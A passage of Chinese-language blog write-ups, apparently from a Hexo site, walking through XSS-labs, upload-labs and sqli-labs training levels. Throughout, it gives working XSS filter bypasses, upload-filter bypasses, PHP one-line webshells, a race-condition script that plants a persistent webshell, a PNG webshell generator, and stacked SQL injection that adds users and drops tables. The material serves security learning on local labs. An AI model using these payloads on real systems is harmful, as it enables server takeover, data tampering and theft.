+<h2 id="第十四关："><a href="#第十四关：" class="headerlink" title="第十四关："></a>第十四关：</h2><p>这一关的网页调用上好像有问题，但是估计是关于iframe的xss漏洞，在第七关的时候我们提到过，所以我们就略过。</p>
+<h2 id="第十五关："><a href="#第十五关：" class="headerlink" title="第十五关："></a>第十五关：</h2><p>这一关我确实没有什么头绪，看源代码也没有想法，于是只能网上找writeup，看来一圈，发现突破点在ng-include指令，这个指令的作用是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、ng-include 指令用于包含外部的 HTML文件。</span><br><span class="line"></span><br><span class="line">2、包含的内容将作为指定元素的子节点。</span><br><span class="line"></span><br><span class="line">3、ng-include 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="line"></span><br><span class="line">4、默认情况下，包含的文件需要包含在同一个域名下。</span><br></pre></td></tr></table></figure>
+
+<p>而src输入的值是添加到ng-include中去了。我们只需要包含一个之前有过漏洞的文件，所以语句为<code>src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1);&gt;&lt;/img&gt;&#39;</code>文件要用引号引起来，就成功执行了。但是不知道为什么<code>src=&#39;level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code>执行不了。文件是加载出来了。</p>
+<h2 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h2><p>当我们在keyword后面输入语句的时候，发现在网页中直接显现出来了，当我们查看页面源代码的时候，发下我们输入的语句被放到了<code>&lt;center&gt;</code>中，那我们直接输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>看能不能执行，结果发现script和斜杠被过滤了，那我们在里面加上一个<code>&lt;a&gt;&lt;/a&gt;</code>标签，加入一个链接，<code>&lt;a href=&#39;javascript:alert(1)&#39;&gt;&lt;/a&gt;</code>但是我们发现空格也被过滤了，那我们该如何绕过呢？在html中，%0a可以当作空格来用，因为script被过滤了，可以在script中加一个%0a，所以最后的语句是<code>&lt;a%0ahref=&quot;javas%0acript:alert(1)&quot;&gt;111&lt;/a&gt;</code>成功绕过。因为&#x2F;被过滤了，所以我们也可以找一个单标签，<code>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code>也可以绕过。</p>
+<h2 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h2><p>这一关有两个参数，这两个参数会拼接到一起，最后访问到swf文件上了，我们可以给第一个参数前面加一个空格，这样参数一就会变成一个参数，但是我们又看不到这个<code>&lt;embed&gt;&lt;/embed&gt;</code>标签，所以我们不能聚焦，点击，所以只能使用鼠标移动这个事件，所以构造的语句是：<code>arg01= onmousemove&amp;arg02=javascript:alert(2)</code>由于这关没有自动跳转，但是我们看代码发现是欧克的，所以直接点击下一关。</p>
+<h2 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h2><p>这一关和上一关一模一样，呃呃呃。</p>
+<h2 id="第十九关："><a href="#第十九关：" class="headerlink" title="第十九关："></a>第十九关：</h2><p>这第十九关和第二十关是关于反编译的问题，现在我还是不太懂，所以先放在这里，以后学会了在做。</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>XSS漏洞练习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传训练</title>
+    <url>/2023/05/15/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在做完了sqli-labs 之后，咋们来看看这个上传文件的题。</p>
+<h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><p>他的界面直接提示着，请选择上传的图片，肯定就会有过滤的，咋们先上传一个<code>.php</code>文件试试水。果然，报错了，说是上传jpg,gif,png 格式的文件，好办，去bp上修改一下，查看源码，这儿是前端验证。如果是前端验证，咋们就把php文件的后缀改为他支持的格式，然后在bp 上再改回来就欧克了。</p>
+<p>上传成功，然后用菜刀连接，直接连接成功。</p>
+<span id="more"></span>
+
+<h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>在这一关咋们看了一下源码，发现这一关是检查文件扩展名Content-type, , 照片的文件扩展名是  image&#x2F;jpeg&#x2F;gif&#x2F;png。php 的文件扩展名是application&#x2F;octet-stream，所以这边就有两种上传方法，第一种是上传图片马，然后在bp上修改文件后缀名，就和上一关一样了，还有一中是直接上传php文件，在bp修改文件扩展名为照片的文件扩展名。用菜刀可以连接。</p>
+<h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><p>这一关看了源代码，发现过滤挺多的，首先是过滤文件名的空格，然后删除文件名的最后的点，删除空格和删除点这个是为了防止iis7.5的解析漏洞，就是在文件名后面加上点或者空格会被windows解析成正常的，不是iis本身的漏洞。然后匹配到点的后面的字符串，也就是保留文件名。 然后再将文件名转换成小写，这就是防止大小写过滤，再去去除字符串 ::$DATA ,,，这个也是为了防止解析漏洞，因为::$DATA会将后面的内容转换为文字流，这个只能在widows上有，最后再去除一下空格。然后判断这个文件名是不是在黑名单中，如果在，上传不成功，如果不在，将文件重新命名为时间戳文件后上传。</p>
+<p>这边我尝试我几种绕过姿势，发现都是可以，接下来我们一一讲解：</p>
+<ol>
+<li>咋们可以发现把::$DATA过滤了，但是只是过滤了一遍，所以我们可以双写来建立这个字符   修改文件名为  <code>test.php::$::$DATADATA</code>,过滤之后发现可以直接上传</li>
+<li>这边的黑名单是php,asp,aspx,jsp ，所以我们可以写php3,5,7,8 phtml ,pht 这些文件，可以绕过</li>
+<li>还可以在php 后面加上冒号，后面跟什么都行  test.php:jpg 因为window会忽略冒号后面的字符，可以直接上传成功。</li>
+</ol>
+<h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>这一关和上一关有点类似，只是将黑名单扩展了一些，所以在这关里第二种方法就不能用，但是我们看黑名单，发现里面没有过滤<code>.htaccess</code> 这个文件，这个文件可以配置文件解析，</p>
+<p><code>&lt;FilesMatch &quot;info.png&quot;&gt; setHandler application/x-httpd-php &lt;/FilesMatch&gt; # 这个是在有这个.htaccess的文件夹中的所有文件含有 info.png  这个字符的文件当成php文件执行</code></p>
+<p><code>AddType application/x-httpd-php .jpg</code>  # 这个的意思是把所有的.jpg文件当作php来执行</p>
+<p>所以我们要先上传.htaccess文件，再上传其他文件。</p>
+<h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><p>还有一种方法是上传 .user.ini 的文件，这个文件的利用比.htaccess更广泛一些，因为这个文件在nginx ,  apache, iis中都可以用。在文件中写  auto_pretend_file&#x3D;test.jpg  意思是将test.jpg 这个文件调用到php 文件中，相当于require函数一样。限制条件是必须要是      只要是以fastcgi运行的php都可以用这个方法。</p>
+<h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><p>这一关查看源代码就发现那个转换为小写的函数没有了，那不就是随便弄嘛，将php 随意大小写 Php ，等等就可以了。</p>
+<h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p>这一关查看源代码，发现转换为小写的函数又回来了，但是删除空格的代码又不见了，简单，直接在php和后面加上空格就欧克了。</p>
+<h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p>不出所料，又是少了一个函数，是去除末尾的点的函数，所以我们直接在php 后面加上一个点。，轻松绕过。</p>
+<h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p>那个删除::$DATA的函数没有了，在php后面加上就行了。</p>
+<h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p>这一关过滤的就很全面了，但是嘞，我们可以看到，他对所有的空格啊，点的过滤都是单次过滤，就是过滤一次就可以了，所以我们可以双写绕过，.php.   .     .php. .     .php::$::$DATADATA 等都是可以的。</p>
+<h2 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h2><p>这一关换了一个函数 ,str_ireplace（）这个函数有三个参数。str_ireplace(word,rep_word,string)意思是把string 中word替换为req_word，就是在过滤后缀名，但是我们可以看到，这只是一次过滤，所以我们可以双写后缀名绕过，例如 .pphphp 这样，把其中一个php去掉之后又组成新的。</p>
+<h2 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h2><p>这一关我们查看源码的话，发现有几个函数，strrpos（string ,p art）函数，这个函数的作用是在string中找到最后一个part 的位置，substr （）函数就是截取字符串。而且是白名单绕过，所以之前使用的方法这一关不太适用。</p>
+<p>所以我们这一关使用截断来绕过上传，因为这个获得的文件路径是在get处，所以我们可以在get处加上截断符号，%00 ，save_path&#x3D;.&#x2F;upload&#x2F;1.php%00，然后上传一个图片马就可以了，他最后文件上传的路径是  .&#x2F;upload&#x2F;1.php  test.jpg，在php 后面的会被%00截断，不会被执行。</p>
+<h2 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h2><p>这一关和上一关的代码大致相同，唯一不同的地方就是获得的路径是post提交过来的，所以我们需要在post 处修改，但是要注意的是，在post 处加%00 需要进行url 编码，才可以执行。依旧是上传图片马，然后修改post。</p>
+<h2 id="第十四关："><a href="#第十四关：" class="headerlink" title="第十四关："></a>第十四关：</h2><p>这一关我们看到界面，给了我们三个提示，第一点，图片马中包含有完整的webshell 。这个简单，我们在文件夹中放两个文件，一个是jpg  &#x2F; png   &#x2F;  gif 的文件，另一个是php的文件，里面写上了phpinfo()。然后在这个目录下面打开cmd ，敲入代码 copy &#x2F;b 1.jpg+1.php test.php，得出一个test.php文件，然后上传之后发现文件的格式变了，可以得出是在检测文件头，所以我们的图片马完全可以。然后我们看文件上传漏洞，发现可以使用file提交get参数，然后把参数加入导入到文件中，这里就是文件包含漏洞，file&#x3D;.&#x2F;upload&#x2F;xxxxxxxxx.jpg。会将jpg文件利用php加载。所以我们可以利用图片马运行webshell。</p>
+<h2 id="第十五关："><a href="#第十五关：" class="headerlink" title="第十五关："></a>第十五关：</h2><p>这一关和上一关是一样的，于是我就有点怀疑怎么会这样，返回上一关，发现提示是检查内容的开头2个字符，而这一关是是使用getimagesize()函数判断，这个函数是检查图片信息的，但是我们制作的图片马依旧可以绕过。</p>
+<h2 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h2><p>这一关的是和之前的一样，只是检测图片的函数不一样，这一关是exif_imagetype()，这个函数是检测图像的第一个字节并检查其签名。但是我们的图片马十分抗打，依旧是完美绕过，可以用菜刀连接。</p>
+<h2 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h2><p>这一关有一个十分厉害的函数  imagecreatefromipeg or imagecreatefrompng or imagecreatefromgif，这三个函数的作用是将传入的jpeg png gif  重新渲染了一遍，然后再上传，如果是单纯的使用cmd 中的copy 来制作图片马的话，人家直接二次渲染，把你的shell直接给渲染不见了，于是我就网上找了一下解决办法，有一个大神，讲解的十分详细，链接在这<code>https://www.cnblogs.com/forforever/p/13191999.html</code>。这里我们需要用到一个工具，叫做hxd（好兄弟？），可以对图片的二进制值进行修改的一个工具，第一次接触到，然后我们需要一个gif的文件，这里我们可以试一下，直接用cmd的copy ，shell是phpinfo();发现webshell根本没有上传成功，然后使用hxd看看对比一下上传前后的文件，发现有一部分在渲染之后是没有改变的。那我们就可以在没变的这部分中加入shell，然后再上传，发现图片马已经上传成功。</p>
+<p>但是问题来了，如果我们不上传gif ，想上传png ，jpg的图片格式呢，如果你像gif一样去试的话，发现是不行的，上传会报错，这是因为png ,jpg都会验证格式的，对于文件中的数据会计算。这里就不赘述了，详细情况可以看上面的链接。</p>
+<h2 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h2><p>这一关的提示是审计代码，奈何本人的水平实在是不行，看不出来，于是上网找writeup，原来是条件竞争漏洞，代码中会先将上传的文件上传到服务器，然后再对这个文件进行一系列的验证，但是在windows中（linux不知道哈），你打开了这个文件，如果你去操作它，比如说删除它或者移动它的话就会报错，我们这一关正是利用这一特性，我们不断上传这个文件，他就会不断创建这个临时文件，然后再不断去验证它，然后我们再通过的别的东西去访问它这个临时文件，那么在某一时刻，临时文件还没来得及验证，或者是还没来得及被删除就被访问到了，那就欧克了，这个文件就相当与上传成功了。</p>
+<p>理论成立，实践开始，首先我们在burpsuite中不断发包，也就是不断上传文件。然后在python 中不断去访问它，那么上传的这个文件中要写啥呢？ 最开始我就写了一个一句话木马，<code>&lt;?php eval($_REQUEST[&#39;xxx&#39;]);?&gt;</code> python的脚本是这样的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:81/upload-labs-master/upload/shell1.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">	code = requests.get(url).status_code</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件上传成功！&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很简单的一个脚本，但是当我同时运行bp和python时，在那个文件夹里可以看到shell1.php文件出来了，有不见了，而且当python文件执行成功时，文件夹中的文件还是一闪一闪的，考虑的一下，可能是文件重名就被后面的覆盖了，这里我就想了两个办法，确切的来说是一个，另一个是借鉴网上的，借鉴哈，不算抄袭，读书人的事，怎么能算是抄袭呢？咳咳。</p>
+<p>第一个办法，就是让python对这个文件保持访问的状态，这样就不会被覆盖，第二个是修改shell1.php中的代码，改为<code>&lt;?php fputs(fopen(&#39;shell2.php&#39;, &#39;w&#39;), &#39;&lt;?php @eval($_REQUEST[&quot;XXX&quot;]);?&gt;&#39;);?&gt;</code>也就是说当这个文件访问成功时，会创建另一个文件，这个文件就是我们的shell。妙哇！果断使用第二个。</p>
+<h2 id="第十九关："><a href="#第十九关：" class="headerlink" title="第十九关："></a>第十九关：</h2><p>这一关还是要审计代码，但是我实在时功力不够，看不懂，于是去网上搜索了一下， 它的检验流程是先判断文件的后缀名，然后再临时上传文件，检验文件，最后再真的上传文件，方法就和上一关一样了，条件竞争漏洞，然而，在使用条件竞争的时候我却失败了，因为它是先检查文件名的。所以我就直接制作了图片马，但是这里不知道为什么，即使上传正确的，没加马的gif文件，上传之后也是不能访问，文件直接被渲染出错了，所以只好使用png文件，但是png文件的检验比较严格，具体参照第十七关，使用大神的脚本生成一个图片马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>他这个图片马有点不太懂，最后生成的马是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，查了一下，原来是要在访问网页的时候给网页后面一个参数，例如  <a href="http://localhost/upload/index.php?0=assert">http://localhost/upload/index.php?0=assert</a>  或者 0&#x3D;eval ，牛逼，但是当我尝试的时候，这个马却报错了，可能是在get的时候有两个参数的原因。因为我最开始不太理解这个马，所以我直接将马改了一下，变成了常用的马  <code>&lt;?php eval($_POST[1])?&gt;</code>，万幸的是也上传成功了。</p>
+<h2 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h2><p>这一关是上传的时候名字可以自己命名，当然包括后缀名，但是对后缀名做了检测，限制了很多，所以这里我们可以使用之前学到的截断来绕过，在定义文件名的时候，.php后面加上一个点，或者使用::$DATA，还可以使用&#x2F;.来pass，还可以使用php的大小写来绕过，%00截断绕过，记得<code>%00</code>要编码哦。</p>
+<h2 id="第二十一关："><a href="#第二十一关：" class="headerlink" title="第二十一关："></a>第二十一关：</h2><p>这一关是一道ctf的题，代码不懂的地方我都查资料弄懂了，我也知道漏洞在哪里，但是就是不知道如何利用这个漏洞，只好查看writeup。</p>
+<p>这个代码是这样的，首先怕判断你的MIME值，必须是jpeg,png,gif 这三种，这个好办，我们直接bp抓包就可以，然后判断你的post那里有没有值，也就是说要不要修改名字，如果要修改，而且修改的文件名不是数组的话，就按照修改的来，如果没有数据，就按照原来的文件名来，将得到的文件名用点分隔成数组，然后判断这个数组的最后一个值在不在白名单中，不在的话报错，在的话继续，定位到这个数组的第一个值，也就是文件名字，再加上数组中数组的个数减一的数，相当于最后一个值，也就是后缀名，然后上传。</p>
+<p>有点绕哈，但是漏洞就在这个话中，修改的文件名不是数组的话，重点，如果我们把要修改的文件名变成数组，而且跳过数组的个数减一这个值，那么我们就可以绕过，使用bp修改数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt;</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">upload-20.php</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">-----------------------------335042777710070242533827549795</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">-----------------------------335042777710070242533827549795--</span><br></pre></td></tr></table></figure>
+
+<p>按照代码流程走一遍，首先MIME的值肯定是没有问题的，在判断修改的文件名这儿发的时候，发现我们提交的是一个数组，也就是说$file &#x3D; Array([0]&#x3D;&gt;upload-20.php  [2]&#x3D;&gt;jpg)是这样的，大家注意哦，这个数组中是没有1对应的值的，然后判断这个数组的最后一个值是不是在白名单中，因为最后一个值是jpg，所以这儿是没有问题的，下一步，重新组合文件名，将数组中的第一个当作文件名字，数组中个数减一个当作后缀名，第一个就是upload-20.php，而数组中有两个数据，减一的话就变成取数组中1的值，那就是空，所以最后文件名就是upload-20.php， 欧克，完美绕过。</p>
+<p>upload-labs靶场的题已经全部完成，也是学到了很多东西，加油，再接再厉！</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqli-labs注入训练（page-3）</title>
+    <url>/2023/05/15/Sqli-Labs%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83/Sqli-Labs-master%20%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83%EF%BC%88Page-3%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Less-38：Less-39：Less-40：Less-41"><a href="#Less-38：Less-39：Less-40：Less-41" class="headerlink" title="Less-38：Less-39：Less-40：Less-41:"></a>Less-38：Less-39：Less-40：Less-41:</h2><p>这几关都是堆叠注入的应用，堆叠注入，顾名思义，就是使用分号将注入语句分开，多次注入，创建新的用户，或者删除用户，创造无限可能。但是需要知道一些数据。</p>
+<p>他也有很多的局限性，比如权限不够，或者收到api或数据库引擎的限制。oracle数据库不支持堆叠注入。</p>
+<p>构造payload</p>
+<p>添加用户 <code>?id=1&#39;;insert into users(id,username,password) values (&#39;30&#39;,&#39;skk&#39;,&#39;skkhj&#39;)--+</code> 后面的值一定要用引号引起来。</p>
+<p>更新用户<code>?id=1;update users set password=&#39;zjwdqc&#39; where id=30--+ </code></p>
+<span id="more"></span>
+
+<h2 id="Less-42：Less-43：Less-44：Less-45"><a href="#Less-42：Less-43：Less-44：Less-45" class="headerlink" title="Less-42：Less-43：Less-44：Less-45:"></a>Less-42：Less-43：Less-44：Less-45:</h2><p>查看页面源代码，发现是在username 做了过滤，可以在username中构造语句</p>
+<p><code>username=admin   passowrd=c&#39;;create table hhhh like users#</code>发现在当前数据库中有一个新的表hhhh</p>
+<p>删除表 <code>password=c&#39;);drop table hhhh#</code>发现之前创建的表被删除了。</p>
+<h2 id="Less-46："><a href="#Less-46：" class="headerlink" title="Less-46："></a>Less-46：</h2><p>从本章开始我们学习的是order by 的相关注入。</p>
+<p>在order by 后面输入?sort&#x3D;1 会根据字段1来排序，后面跟上desc 会变成升序，asc是降序。我们构造payload的方法由这么几种：</p>
+<ol>
+<li><p>直接添加注入语句，?sort&#x3D;(select ****) 后面直接加上要注入的语句</p>
+</li>
+<li><p>可以利用一些函数  sort&#x3D;rand(sql语句) rand(true) 和rand(false)是不一样的</p>
+</li>
+<li><p>可以利用报错注入和延时注入。<code>sort=(select count(*) from information_schema.tables group by concat(0x3a,0x3a,(select database()),floor(rand()*2)))--+</code>不知道为什么后面一定要加上floor(rand()*2)才会显示。。。。</p>
+<p><code>?sort=rand(ascii(substr(database(),1,1))=118)--+</code>另一种</p>
+</li>
+<li><p>延时注入  可以利用sort&#x3D;1 and 注入语句</p>
+</li>
+<li><p>procedure analyse 参数爆错注入  <code>sort=1 procedure analyse(extractvalue(1,concat(0x3a,database(),0x3a)))--+</code>   不知道为什么我不行</p>
+</li>
+<li><p>导入导出文件 into otfile参数  <code>sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\test1.txt&quot;lines terminated by 0x6768683c3e</code>利用lines perminated by 创建大马</p>
+</li>
+</ol>
+<h2 id="Less-47："><a href="#Less-47：" class="headerlink" title="Less-47："></a>Less-47：</h2><p>利用上面的手段都可以得到结果。</p>
+<h2 id="Less-48：Less-49："><a href="#Less-48：Less-49：" class="headerlink" title="Less-48：Less-49："></a>Less-48：Less-49：</h2><p>这一关和46关的不一样的地方就是不能报错注入，没有错误回显，所以我们可以用sort(true&#x2F;false)来判断，还可以使用延时注入。</p>
+<h2 id="Less-50：Less-51：Less-52：Less-53："><a href="#Less-50：Less-51：Less-52：Less-53：" class="headerlink" title="Less-50：Less-51：Less-52：Less-53："></a>Less-50：Less-51：Less-52：Less-53：</h2><p>这一关开始是order by stacked injection 注入。</p>
+<p>执行sql 语句这里用的是mysqli-mulyi-query() 和之前的mysqli_query(）不一样的地方是可以执行多条sql语句。这就和之前的一样了。</p>
+<p>就这样我们来到了page-4!</p>
+<p>page-4是将上面的全部结合起来考核的，这个我就不写了，方法在上面已经介绍的差不多了。</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqli-Labs-master 注入训练(Page-2)</title>
+    <url>/2023/05/15/Sqli-Labs%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83/Sqli-Labs-master%20%E6%B3%A8%E5%85%A5%E8%AE%AD%E7%BB%83%EF%BC%88Page-2%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>欧克，我们来到了第二大关，让我们开始吧！</p>
+<h2 id="Less-23："><a href="#Less-23：" class="headerlink" title="Less-23："></a>Less-23：</h2><p>这一关和第一大关的前面一些题比较像，首先输入？id&#x3D;1，我们尝试输入单引号，发现报错了，这儿有注入，我输入一个双引号，后面加上–+ ，不报错了，经过多次尝试发现，报错的不明不白，于是就看了一下源码，好家伙，原来是过滤了–+和#，也就是注释符，那好办，直接字符注入 <code>?id=1&#39; and &#39;1&#39;=&#39;1</code>，在中间加上盲注，举个例子：<code>?id=1&#39; and length(database())&gt;1 and &#39;1&#39;=&#39;1</code>，其他的就和page1一样就行。</p>
+<p>还有一种方法，是利用后面的单引号闭合，使用联合查询。</p>
+<p><code>?id=1&#39; union select &#39;1&#39;,version(),&#39;3</code>，在这里因为我们不能使用order by 语句来查询数据，所以我们只能慢慢猜，当我们的字段查询到第四个的时候，报错，说明字段只有三个。然后只要修改version()那里的语句，换成查询语句就可以了。</p>
+<span id="more"></span>
+
+<h2 id="Less-24："><a href="#Less-24：" class="headerlink" title="Less-24："></a>Less-24：</h2><p>这一关主要是利用二次注入，就是在最开始的时候使用正常的途径来将含有注入的信息存储到数据库中，在第二次的时候读取这个数据，便会执行想要的结果。</p>
+<p>查看页面源代码，发现在登录的地方和创建新用户的地方都有过滤，但是在更新密码的地方没有字符过滤，那我们就从这里入手，首先点击创建一个新的用户名，这时候我们要知道在这个数据库中有哪些用户名，好针对这个用户名进入二阶注入，咋们已经知道这个数据库中有一个用户名叫Dumb （我认为这个在实战的时候用处应该不是很大，不过如果那些粗心的人用户名是admin 可能会好一点，本案例中也有admin，咋们换一个）,在创建新用户名那里写  Dumb’#，密码就随便，123456，注册好之后登录进去，就是修改界面，输入新密码000000，当点击更新之后，因为我们的用户名在作怪，所以更新的是Dumb的密码，然后就可以用这个账号密码登录。 </p>
+<h2 id="Less-25："><a href="#Less-25：" class="headerlink" title="Less-25："></a>Less-25：</h2><p>这一关是过滤了and 和or ，当我们输入这两个的时候，会替换成空，遇到这种情况的时候，我们大致有四种方法：</p>
+<ol>
+<li>使用大小写绕过，因为MySQL对大小写不敏感，例如写成ANd , AnD , Or , OR 等等。但是在这一关不行也会被过滤掉。</li>
+<li>编码，hex, urlencode   and 的hex编码（%61%6e%64）or  的hex编码（%6f%72）但是这一关也不行，因为会自动解码</li>
+<li>添加注释&#x2F;<em>and, or</em>&#x2F;这一关也行不通</li>
+<li>多次注入，也就是多写几遍或者把过滤的字符过滤后可以组成新的and ,or，例如 anandd, oorr, 可以和大小写结合使用，这一关是欧克的，可以使用。</li>
+<li>还有就是利用符号代替  and &#x3D;&#x3D; &amp;&amp; , or &#x3D;&#x3D; || ,但是在这一关中，&amp;&amp; 也是不行的，||这个但是可以，，然后其他的就和之前的一样，联合查询注入还是报错注入就任你选择了， 这里选择报错注入  <code>?id=1&#39; || extractvalue(1,concat(&#39;~&#39;,database()))--+</code>就欧克了。</li>
+</ol>
